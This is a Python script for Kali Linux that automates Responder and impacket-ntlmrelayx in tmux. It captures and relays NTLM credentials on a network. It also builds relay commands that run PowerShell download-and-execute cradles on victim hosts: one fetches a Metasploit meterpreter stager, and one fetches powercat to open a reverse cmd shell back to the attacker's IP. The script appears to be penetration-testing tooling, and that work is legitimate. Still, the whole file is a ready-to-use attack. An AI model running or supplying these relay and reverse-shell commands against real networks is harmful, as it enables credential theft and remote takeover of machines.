#!/usr/bin/env python3

import argparse
import logging
import os
import subprocess
import fileinput

try:
    import libtmux
except ImportError:
    print("libtmux not installed. Please install it with 'apt install python3-libtmux'")
    exit(1)
    
def check_prerequisites():
    check = True
    
    # Check if the operating system is Kali Linux
    if not os.path.exists("/etc/os-release"):
        print("This script is designed to run on Kali Linux.")
        exit(1)
    with open("/etc/os-release") as f:
        if "Kali" not in f.read():
            print("This script is designed to run on Kali Linux.")
            exit(1)
    
    # Check if tmux is installed
    try:
        subprocess.run(['tmux', '-V'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except subprocess.CalledProcessError:
        print("tmux not installed. Please install it with 'apt install tmux'")
        check = False
    
    # Check if Responder is installed
    if not os.path.exists("/usr/share/responder/Responder.conf"):
        print("Responder not installed. Please install it with 'apt install responder'")
        check = False
    
    # Check if ntlmrelayx is installed
    if not os.path.exists("/usr/bin/impacket-ntlmrelayx"):
        print("ntlmrelayx not installed. Please install it with 'apt install python3-impacket impacket-scripts'")
        check = False
        
    # Check if Metasploit is installed
    if not os.path.exists("/usr/bin/msfconsole"):
        print("Metasploit not installed. Please install it with 'apt install metasploit-framework'")
        check = False
        
    # Check if villain is installed
    if not os.path.exists("/usr/bin/villain"):
        print("villain not installed. Please install it with 'apt install villain'")
        check = False
        
    return check

def main():
    
    #------------------------------------------------------------------------------
    # Configure Argparse to handle command line arguments
    #------------------------------------------------------------------------------
    desc = "Responder / NTLMRelayX automation script"
    
    parser = argparse.ArgumentParser(description=desc)
    
    parser.add_argument('-d','--debug',
                        help='Print lots of debugging statements',
                        action="store_const",dest="loglevel",const=logging.DEBUG,
                        default=logging.WARNING
    )
    parser.add_argument('-v','--verbose',
                        help='Be verbose',
                        action="store_const",dest="loglevel",const=logging.INFO
    )
    parser.add_argument('host_ip', help='Host IP',
                        nargs='?', default = ''
    )
    parser.add_argument('target_ip', help='Target IP / Range / Subnet (nmap format)',
                        nargs='?', default = ''
    )
    parser.add_argument('--port', '-p', help='Port for MSF web handler (443)',
                        default='443'
    )
    
    parser_command=parser.add_mutually_exclusive_group(required=True)
    
    parser_command.add_argument('--capture', help='Capture credentials only - no relay',
                        action='store_const', dest='action', const='capture', default='capture'
    )
    
    parser_command.add_argument('--shell', help='Start Villain reverse shell listener as relay target',
                        action='store_const', dest='action', const='shell'
    )
    parser_command.add_argument('--msf', help='Start Metasploit listener as relay target',
                        action='store_const', dest='action', const='msf'
    )
    parser_command.add_argument('--command', help='Command to relay to targets',
                        dest='action'
    )

    args = parser.parse_args()
    
    host_ip = args.host_ip
    target_ip = args.target_ip
    msf_srvport = args.port
    msf_lport = '8443'
    action=args.action
    
    if check_prerequisites() == False:
        print("Please install the required packages and try again.")
        exit(1)
    
    if action=='capture':
        launch_relayx=False
        launch_msf=False
        launch_villain=False
        window_layout='even-horizontal'
    elif action=='shell':
        launch_relayx=True
        launch_msf=False
        launch_villain=True
        window_layout='main-vertical'
    elif action=='msf':
        launch_relayx=True
        launch_msf=True
        launch_villain=False
        window_layout='main-vertical'
    else:
        launch_relayx=True
        launch_msf=False
        launch_villain=False
        relayx_command=action
        window_layout='even-horizontal'
    
    if not host_ip:
        host_ip = input("\nEnter interface IP address to listen on: ")
    if not target_ip and not action=='capture':
        target_ip = input("\nEnter relay target IP / Range / Subnet (nmap format): ")
    
    # Run base image docker entrypoint so environment variables are parsed into config files like normal
    subprocess.Popen("/opt/entrypoint.sh", shell=True).wait()
    
    # Set up tmux window
    tmux_server = libtmux.Server()
    tmux_session = tmux_server.new_session(session_name="mitm", window_name="mitm", kill_session=True)
    tmux_window =  tmux_session.select_window("mitm")
    tmux_pane = tmux_window.attached_pane
    
    if launch_relayx:
        print("Getting relay target list")
        subprocess.Popen("/opt/check-smb-signing.sh --finger --host-discovery --finger-path /usr/share/responder/tools/RunFinger.py --out-dir /tmp -a %s" % (target_ip), shell=True).wait()
        
    if launch_msf:
        command = 'msfconsole -q -x "use exploit/multi/script/web_delivery; set target 2; set uripath /; set ssl true; set srvport %s; set payload windows/meterpreter/reverse_https; set exitonsession false; set lhost %s; set lport %s; set enablestageencoding true; set autorunscript migrate -f; exploit -j -z"' % (msf_srvport, host_ip, msf_lport)
        tmux_pane.send_keys(command)
        
        relayx_command = 'powershell -nop -exec bypass -c "IEX((New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/code_execution/Invoke-MetasploitPayload.ps1\'); Invoke-MetasploitPayload \'https://%s:%s/\'"' % (host_ip, msf_srvport)
        
        tmux_pane = tmux_pane.split_window()
        
    if launch_villain:
        command = f'villain'
        tmux_pane.send_keys(command)
        
        relayx_command = f'powershell -nop -exec bypass -c "IEX(New-Object System.Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1\');powercat -c {host_ip} -p 4443 -e cmd"'
        
        tmux_pane = tmux_pane.split_window()
        
    if launch_relayx:
        for line in fileinput.input("/usr/share/responder/Responder.conf", inplace=True):
            line=line.replace("SMB = On","SMB = Off")
            line=line.replace("HTTP = On","HTTP = Off")
            line=line.replace("HTTPS = On","HTTPS = Off")
            print(line)
        fileinput.close()
        
        if os.path.exists("/tmp/hosts-signing-false"):
            command = "impacket-ntlmrelayx --remove-mic -remove-target -smb2support -socks -tf %s -c '%s'" % ("/tmp/hosts-signing-false.txt", relayx_command)
        else:
            command = "impacket-ntlmrelayx --remove-mic -remove-target -smb2support -socks -c '%s'" % (relayx_command)
            
        
        tmux_pane.send_keys(command)
        
        tmux_pane = tmux_pane.split_window()
    
    # Temporarily disable to be quieter
    
    # for line in fileinput.input("/usr/share/responder/Responder.conf", inplace=True):
    #     line=line.replace("Challenge = Random","Challenge = 1122334455667788")
    #     print(line)
    # fileinput.close()
    
    command = "responder -I eth0 -d -w -e " + host_ip
    
    tmux_pane.send_keys(command)
    
    tmux_window.select_layout(window_layout)
    tmux_server.attach_session(target_session="mitm")
    
    
    
if __name__ == '__main__':
    main()